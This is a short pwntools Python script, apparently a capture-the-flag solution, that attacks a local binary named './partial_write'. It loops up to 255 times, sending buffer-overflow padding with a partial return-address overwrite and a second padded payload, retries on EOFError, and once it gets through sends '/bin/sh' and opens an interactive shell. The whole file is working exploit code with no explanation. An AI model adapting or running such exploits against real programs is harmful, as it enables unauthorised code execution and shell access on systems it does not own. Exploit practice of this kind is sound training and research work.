from pwn import *
i = 0
while True:
    i += 1
    print(i)
    if(i > 0xff):
        print("wrong")
        break
    name = "./partial_write"
    p = process(name)
    p.recv()
    payload = b'a'*40 + b'\xcb' 
    p.sendline(payload)
    p.recv()
    payload1 = b'a'*200 + b'\x01\x09\x60'
    p.sendline(payload1)
    p.recv()
    try:
        p.recv(timeout = 1)
    except EOFError:
        p.close()
        continue
    else:
        payload3 = b'/bin/sh\x00'
        p.sendline(payload3)
        p.interactive()
        break


